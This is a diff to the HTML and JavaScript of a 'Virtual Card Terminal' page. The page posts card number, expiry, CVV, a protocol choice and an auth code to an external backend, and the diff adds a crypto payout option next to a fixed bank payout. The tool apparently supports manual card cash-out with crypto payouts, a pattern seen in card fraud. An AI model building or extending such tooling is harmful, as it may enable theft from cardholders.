@@ -26,7 +26,13 @@
       <h1>Virtual Card Terminal</h1>
 
       <form id="cardForm" autocomplete="off">
-        <input type="hidden" name="payout_type" value="BANK" />
+
+        <!-- Payout Method -->
+        <label>Payout Method</label>
+        <select name="payout_type" required>
+          <option value="BANK">Bank (Default from backend)</option>
+          <option value="CRYPTO">Crypto</option>
+        </select>
 
         <label>Card Number</label>
         <input name="card_number" placeholder="4111111111111111" required />
@@ -70,8 +76,8 @@
           </div>
         </div>
 
-        <button id="submitBtn" type="submit">Process Payment → Send to Default Bank</button>
-        <div class="note">Payout destination is fixed by backend to your default account.</div>
+        <button id="submitBtn" type="submit">Process Payment</button>
+        <div class="note">If Bank is selected, payout destination will be fixed to your backend's default account.</div>
 
         <div id="result" class="result" style="display:none;"></div>
       </form>
@@ -83,7 +89,6 @@
   </div>
 
   <script>
-    // Point to your deployed backend
     const BACKEND_URL = "https://befe.onrender.com";
 
     const form = document.getElementById('cardForm');
@@ -98,14 +103,14 @@
 
       const fd = new FormData(form);
       const payload = {
+        payout_type:  fd.get('payout_type'),
         card_number:  fd.get('card_number').trim(),
         expiry_month: fd.get('expiry_month').trim(),
         expiry_year:  fd.get('expiry_year').trim(),
         cvv:          fd.get('cvv').trim(),
         protocol:     fd.get('protocol'),
         auth_code:    fd.get('auth_code').trim(),
-        amount:       Number(fd.get('amount')),
-        payout_type:  'BANK' // backend uses env vars for bank details
+        amount:       Number(fd.get('amount'))
       };
 
       try {
